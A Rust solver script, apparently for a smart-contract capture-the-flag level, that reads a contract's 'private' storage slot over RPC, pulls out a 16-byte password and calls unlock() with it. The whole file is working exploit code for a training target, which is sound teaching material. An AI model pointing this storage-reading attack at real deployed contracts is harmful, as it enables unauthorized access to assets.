use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers_core::abi::ethereum_types::H128;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function unlock(bytes16) public 
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let data_2 = client
        .get_storage_at(
            level.instance.parse::<Address>()?,
            H256::from_low_u64_be(5),
            None,
        )
        .await?;
    let password = H128::from_slice(&data_2[0..16]);
    println!("data[2]: {:?}", data_2);
    println!("password: {:?}", password);

    let contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());
    let receipt = contract
        .unlock(password.into())
        .legacy()
        .send()
        .await?
        .await?;
    println!("unlock():\n{}", serde_json::to_string_pretty(&receipt)?);

    Ok(())
}
